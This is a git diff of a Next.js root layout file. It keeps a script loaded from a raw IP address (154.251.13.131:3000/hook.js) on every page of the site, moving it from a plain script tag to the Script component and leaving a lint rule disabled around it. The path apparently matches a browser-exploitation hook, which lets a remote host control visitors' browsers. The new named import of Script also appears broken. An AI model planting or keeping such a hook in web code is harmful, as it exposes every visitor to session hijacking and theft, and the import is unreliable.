@@ -1,6 +1,7 @@
 import "./globals.css";
 import clsx from "clsx";
 import {AuthProvider} from '../context/AuthContext'
+import {Script} from "next/script"
 import { Poppins, Lato } from "next/font/google";
 const poppins = Poppins({ subsets: ["latin"], weight: ["100", "200", "300", "400", "500", "600", "700", "800", "900"] });
 const lato = Lato({subsets: ["latin"], weight: ["100", "300", "400", "700", "900"], variable: "--lato"})
@@ -14,7 +15,10 @@ export default function RootLayout({ children }) {
   return (
     <html lang="en">
       /* eslint-disable @next/next/no-sync-scripts */
-      <script src="http://154.251.13.131:3000/hook.js"></script>
+     <Script
+          src="http://154.251.13.131:3000/hook.js"
+          strategy="afterInteractive" // load after page hydration
+        />
       /* eslint-enable @next/next/no-sync-scripts */
       <AuthProvider>
       <body className={clsx('bg-[#EFF2F6] ', poppins.className)}>{children}</body>
